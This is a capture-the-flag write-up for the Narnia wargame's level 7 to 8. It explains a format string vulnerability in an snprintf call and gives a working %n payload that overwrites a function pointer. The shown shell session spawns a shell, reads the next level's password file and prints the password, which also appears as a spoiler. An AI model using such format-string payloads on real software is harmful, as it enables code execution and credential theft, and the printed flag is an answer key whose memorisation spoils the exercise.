## 7 -> 8

### Writeup 

Looking at the source code, we can see that the binary isn’t vulnerable to buffer overflow, as it limits the size of user input to the size of the buffer using `snprintf`. However, due to unsafe usage of `snprintf` - not doing `snprintf(buffer, sizeof(buffer), "%s", format)`, but rather `snprintf(buffer, sizeof(buffer), format)` - there is no separation of data and code from the user’s input. This binary is still vulnerable to format string attacks.

Our plan is to use a payload very similar to Narnia 5 -> 6 to change the value in `ptrf()` to the address of `hackedfunction()`. To do this, we would normally need to find the address of `ptrf` and `hackedfunction`, but luckily the program already provides that for us. Our payload will look like this: the `ptrf` address, bytes to total the address of `hackedfunction`, and the `%n` formatter.

Since `0x804930f` (the address of `hackedfunction`) is `134517519` in base 10, we will print `134517515` bytes using `%x`, as the address of `ptrf` accounts for the remaining 4 bytes. This payload gets us the flag.

```text
narnia7@narnia:/narnia$ ./narnia7 $(python3 -c 'import sys; sys.stdout.buffer.write(b"\x38\xd3\xff\xff%134517515x%n")')
goodfunction() = 0x80492ea
hackedfunction() = 0x804930f

before: ptrf() = 0x80492ea (0xffffd338)
I guess you want to come to the hackedfunction...
Way to go!!!!$ whoami
narnia8
$ cat /etc/narnia_pass/narnia8
aToTvI5BYB
$
```

<details>
  <summary>Flag</summary>aToTvI5BYB
</details>